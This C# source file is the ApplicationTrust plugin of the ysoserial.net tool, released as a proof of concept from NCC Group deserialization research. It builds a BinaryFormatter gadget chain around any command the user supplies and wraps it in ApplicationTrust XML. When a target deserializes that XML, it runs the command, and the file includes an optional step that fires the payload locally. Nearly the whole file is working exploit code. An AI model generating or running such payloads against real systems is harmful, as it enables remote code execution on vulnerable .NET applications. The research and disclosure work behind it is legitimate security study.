using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using ysoserial.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `ApplicationTrust.FromXml(SecurityElement) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.security.policy.applicationtrust.fromxml 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  This PoC produces an error and may crash the application
 **/

namespace ysoserial.Plugins
{
    public class ApplicationTrustPlugin : IPlugin
    {
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
            };

        public string Name()
        {
            return "ApplicationTrust";
        }

        public string Description()
        {
            return "Generates XML payload for the ApplicationTrust class";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.Test = test;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }
            String payloadValue = "";
            string payload = @"<ApplicationTrust version=""1"" TrustedToRun=""true"">
<ExtraInfo Data=""{0}"">
</ExtraInfo>
<!--  the following commented tags can be enabled when needed-->
<!--
<DefaultGrant>
<PolicyStatement version=""1"">
<PermissionSet class=""System.Security.PermissionSet"" version=""1""/>
</PolicyStatement>
</DefaultGrant>
-->
</ApplicationTrust>
";
            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            payloadValue = BitConverter.ToString(osf).Replace("-", string.Empty);
            payload = String.Format(payload, payloadValue);

            if (minify)
            {
                payload = XmlHelper.Minify(payload, null, null);
            }

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    System.Security.SecurityElement malPayload = System.Security.SecurityElement.FromString(payload);
                    System.Security.Policy.ApplicationTrust myApplicationTrust = new System.Security.Policy.ApplicationTrust();
                    myApplicationTrust.FromXml(malPayload);
                    Console.WriteLine(myApplicationTrust.ExtraInfo);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }

            return payload;
        }
    }
}
